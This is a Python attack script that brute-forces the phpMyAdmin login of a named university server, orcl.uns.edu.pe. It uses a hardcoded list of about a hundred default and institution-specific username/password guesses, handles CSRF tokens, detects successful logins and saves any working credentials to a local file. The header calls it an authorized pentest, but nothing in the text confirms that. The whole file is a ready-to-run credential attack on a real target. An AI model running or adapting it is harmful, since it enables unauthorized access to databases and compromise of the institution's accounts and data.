#!/usr/bin/env python3
"""
phpMyAdmin Brute-Force - Pentest Autorizado UNS
================================================
Script de fuerza bruta rapido contra phpMyAdmin 5.2.3 en orcl.uns.edu.pe
Usa requests + ThreadPoolExecutor para probar credenciales en segundos.

Uso: python phpmyadmin_bruteforce.py
"""

import os
import sys

# Fix Windows encoding
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if sys.stderr.encoding != 'utf-8':
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

import requests
import urllib3
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Desactivar warnings de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://orcl.uns.edu.pe"
LOGIN_URL = f"{TARGET}/index.php?route=/"

# ═══════════════════════════════════════════════════════════
# DICCIONARIO DE CREDENCIALES COMUNES
# Enfocado en MySQL/MariaDB + contexto universitario UNS
# ═══════════════════════════════════════════════════════════
CREDENTIALS = [
    # MySQL defaults
    ("root", ""),
    ("root", "root"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "mysql"),
    ("root", "123456"),
    ("root", "12345678"),
    ("root", "admin"),
    ("root", "admin123"),
    ("root", "Pass@123"),
    ("root", "root123"),
    ("root", "P@ssw0rd"),
    ("root", "qwerty"),
    ("root", "abc123"),
    ("root", "letmein"),
    ("root", "master"),
    ("root", "1234"),
    ("root", "pass"),
    
    # Usuarios comunes de phpMyAdmin / MySQL
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "P@ssw0rd"),
    ("pma", ""),
    ("pma", "pma"),
    ("pma", "password"),
    ("mysql", ""),
    ("mysql", "mysql"),
    ("phpmyadmin", ""),
    ("phpmyadmin", "phpmyadmin"),
    ("phpmyadmin", "password"),
    ("test", ""),
    ("test", "test"),
    ("test", "test123"),
    ("dbadmin", ""),
    ("dbadmin", "dbadmin"),
    ("dbadmin", "admin"),
    ("dba", ""),
    ("dba", "dba"),
    ("dba", "password"),
    ("db", "db"),
    ("db", "password"),
    ("user", ""),
    ("user", "user"),
    ("user", "password"),
    ("user", "123456"),
    ("guest", ""),
    ("guest", "guest"),
    
    # Contexto universitario UNS / Oracle
    ("oracle", "oracle"),
    ("oracle", ""),
    ("oracle", "password"),
    ("oracle", "Oracle123"),
    ("orcl", "orcl"),
    ("orcl", "oracle"),
    ("orcl", "password"),
    ("uns", "uns"),
    ("uns", "uns123"),
    ("uns", "password"),
    ("uns", "uns2024"),
    ("uns", "uns2025"),
    ("uns", "uns2026"),
    ("sigea", "sigea"),
    ("sigea", "sigea123"),
    ("sistema", "sistema"),
    ("sistema", "sistema123"),
    ("sistema", "sistema2024"),
    ("siigaa", "siigaa"),
    ("siigaa", "siigaa123"),
    ("campus", "campus"),
    ("campus", "campus123"),
    ("webmaster", "webmaster"),
    ("webmaster", "password"),
    ("soporte", "soporte"),
    ("soporte", "soporte123"),
    ("informatica", "informatica"),
    ("informatica", "info123"),
    ("admin_uns", "admin_uns"),
    ("admin_orcl", "admin_orcl"),
    ("bd_uns", "bd_uns"),
    ("dbuns", "dbuns"),
    
    # Credenciales adicionales comunes
    ("root", "changeme"),
    ("root", "default"),
    ("root", "manager"),
    ("root", "secret"),
    ("root", "test"),
    ("root", "welcome"),
    ("root", "welcome1"),
    ("root", "password1"),
    ("root", "Password1"),
    ("root", "Pa$$w0rd"),
    ("administrator", ""),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("sa", ""),
    ("sa", "sa"),
    ("sa", "password"),
    ("postgres", "postgres"),
    ("postgres", "password"),
]

# Eliminar duplicados manteniendo orden
seen = set()
UNIQUE_CREDS = []
for cred in CREDENTIALS:
    if cred not in seen:
        seen.add(cred)
        UNIQUE_CREDS.append(cred)
CREDENTIALS = UNIQUE_CREDS


def get_login_token(session):
    """Obtiene el token CSRF de la página de login de phpMyAdmin."""
    try:
        resp = session.get(LOGIN_URL, verify=False, timeout=15)
        # Buscar el token en el formulario
        token_match = re.search(r'name="token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            token_match = re.search(r'token=([a-f0-9]+)', resp.text)
        if not token_match:
            # Buscar en set_token
            token_match = re.search(r'set_token\s*=\s*["\']([^"\']+)', resp.text)
        
        token = token_match.group(1) if token_match else None
        
        # Buscar el nombre del campo de servidor
        server_match = re.search(r'name="server"\s+value="(\d+)"', resp.text)
        server = server_match.group(1) if server_match else "1"
        
        return token, server, resp.cookies
    except Exception as e:
        print(f"  [!] Error obteniendo token: {e}")
        return None, "1", None


def try_login(username, password, index, total):
    """Intenta un login contra phpMyAdmin."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    
    try:
        # Obtener token CSRF fresco para cada intento
        token, server, cookies = get_login_token(session)
        
        if not token:
            pwd_display = password if password else "(vacía)"
            print(f"  [{index}/{total}] {username}:{pwd_display} → ⚠️  Sin token CSRF")
            return None
        
        # Preparar datos del POST
        data = {
            "pma_username": username,
            "pma_password": password,
            "server": server,
            "token": token,
        }
        
        # Enviar login
        resp = session.post(
            LOGIN_URL,
            data=data,
            verify=False,
            timeout=15,
            allow_redirects=True
        )
        
        pwd_display = password if password else "(vacía)"
        
        # Verificar si el login fue exitoso
        # phpMyAdmin redirige al dashboard si login OK
        if any(indicator in resp.text for indicator in [
            "server_databases.php",
            "navigation.php", 
            "db_structure.php",
            "server_status.php",
            "phpmyadmin-page-content",
            "server_variables",
            "Cerrar sesión",
            "Log out",
            "server_sql.php",
            "SHOW DATABASES",
        ]):
            print(f"\n  🔓 [{index}/{total}] ¡¡¡ACCESO EXITOSO!!! → {username}:{pwd_display}")
            print(f"  🔓 URL final: {resp.url}")
            return (username, password, resp.url)
        
        # Verificar mensajes de error específicos
        if "Access denied" in resp.text or "mysqli" in resp.text.lower():
            print(f"  [{index}/{total}] {username}:{pwd_display} → ❌ Access denied")
        elif "Cannot log in to the MySQL server" in resp.text:
            print(f"  [{index}/{total}] {username}:{pwd_display} → ❌ Cannot connect")
        elif "#1045" in resp.text:
            print(f"  [{index}/{total}] {username}:{pwd_display} → ❌ Error 1045")
        elif "login" in resp.url.lower() or "index.php" in resp.url:
            print(f"  [{index}/{total}] {username}:{pwd_display} → ❌ Rechazado")
        else:
            print(f"  [{index}/{total}] {username}:{pwd_display} → ❓ Respuesta inesperada (revisar)")
            # Guardar para análisis
            return ("REVIEW", username, password, resp.text[:500])
        
        return None
        
    except requests.exceptions.Timeout:
        pwd_display = password if password else "(vacía)"
        print(f"  [{index}/{total}] {username}:{pwd_display} → ⏱️  Timeout")
        return None
    except Exception as e:
        pwd_display = password if password else "(vacía)"
        print(f"  [{index}/{total}] {username}:{pwd_display} → ❗ Error: {e}")
        return None


def main():
    print("=" * 65)
    print("  phpMyAdmin Brute-Force — Pentest Autorizado UNS")
    print(f"  Target: {TARGET}")
    print(f"  Credenciales a probar: {len(CREDENTIALS)}")
    print("=" * 65)
    
    # Verificar que el target está vivo
    print("\n[*] Verificando conectividad...")
    try:
        r = requests.get(TARGET, verify=False, timeout=10)
        print(f"  [+] Target responde: HTTP {r.status_code}")
        if "phpMyAdmin" not in r.text:
            print("  [!] ADVERTENCIA: No parece ser phpMyAdmin")
    except Exception as e:
        print(f"  [!] No se puede conectar: {e}")
        sys.exit(1)
    
    # Extraer info de versión
    print("\n[*] Recopilando información...")
    try:
        r = requests.get(f"{TARGET}/README", verify=False, timeout=10)
        if r.status_code == 200 and "phpMyAdmin" in r.text:
            version_match = re.search(r'Version\s+([\d.]+)', r.text)
            if version_match:
                print(f"  [+] phpMyAdmin Version: {version_match.group(1)}")
    except:
        pass
    
    # Ejecutar brute-force secuencial (para respetar rate-limiting)
    print(f"\n[*] Iniciando prueba de credenciales ({len(CREDENTIALS)} combinaciones)...\n")
    
    start_time = time.time()
    found = []
    review = []
    
    for i, (user, pwd) in enumerate(CREDENTIALS, 1):
        result = try_login(user, pwd, i, len(CREDENTIALS))
        
        if result:
            if isinstance(result, tuple) and result[0] == "REVIEW":
                review.append(result)
            elif isinstance(result, tuple):
                found.append(result)
                # Continuar probando para encontrar más cuentas
        
        # Pequeña pausa para no saturar
        time.sleep(0.3)
    
    elapsed = time.time() - start_time
    
    # Resumen
    print("\n" + "=" * 65)
    print("  RESULTADOS")
    print("=" * 65)
    print(f"  Tiempo total: {elapsed:.1f}s")
    print(f"  Credenciales probadas: {len(CREDENTIALS)}")
    print(f"  Velocidad: {len(CREDENTIALS)/elapsed:.1f} intentos/seg")
    
    if found:
        print(f"\n  🔓 CREDENCIALES VÁLIDAS ENCONTRADAS: {len(found)}")
        for user, pwd, url in found:
            pwd_display = pwd if pwd else "(vacía)"
            print(f"    → {user} : {pwd_display}")
            print(f"      URL: {url}")
    else:
        print(f"\n  🔒 No se encontraron credenciales válidas con el diccionario actual.")
    
    if review:
        print(f"\n  ❓ RESPUESTAS PARA REVISAR: {len(review)}")
        for item in review:
            print(f"    → {item[1]}:{item[2]}")
            print(f"      Response: {item[3][:200]}")
    
    print("\n" + "=" * 65)
    
    # Guardar resultados
    results_file = r"c:\Users\Leguion T\Desktop\plan te pent\findings\brute_force_results.txt"
    with open(results_file, "w", encoding="utf-8") as f:
        f.write(f"phpMyAdmin Brute-Force Results\n")
        f.write(f"Target: {TARGET}\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Credentials tested: {len(CREDENTIALS)}\n")
        f.write(f"Time: {elapsed:.1f}s\n\n")
        if found:
            f.write("VALID CREDENTIALS:\n")
            for user, pwd, url in found:
                f.write(f"  {user}:{pwd}\n")
        else:
            f.write("No valid credentials found.\n")
    
    print(f"  Resultados guardados en: {results_file}")


if __name__ == "__main__":
    main()
